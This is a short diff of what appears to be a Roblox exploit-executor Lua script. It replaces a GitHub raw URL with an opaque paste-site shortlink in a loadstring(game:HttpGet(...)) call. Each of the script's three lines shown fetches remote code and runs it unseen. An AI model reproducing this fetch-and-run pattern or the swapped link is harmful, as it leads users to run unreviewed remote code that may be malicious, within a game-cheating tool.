@@ -20,7 +20,7 @@ local content = Services.HttpService:JSONEncode(options)
 writefile("data.txt", content)
 
 -- Initiating Protections here:
-loadstring(game:HttpGet("https://raw.githubusercontent.com/AnthonyIsntHere/anthonysrepository/main/scripts/AntiChatLogger.lua", true))()
+loadstring(game:HttpGet("https://shz.al/~AnthonyAntiChatLogger", true))()
 
 -- Initiating handler
 loadstring(game:HttpGet("https://raw.githubusercontent.com/synnyyy/synergy/additional/temp.lua", true))()
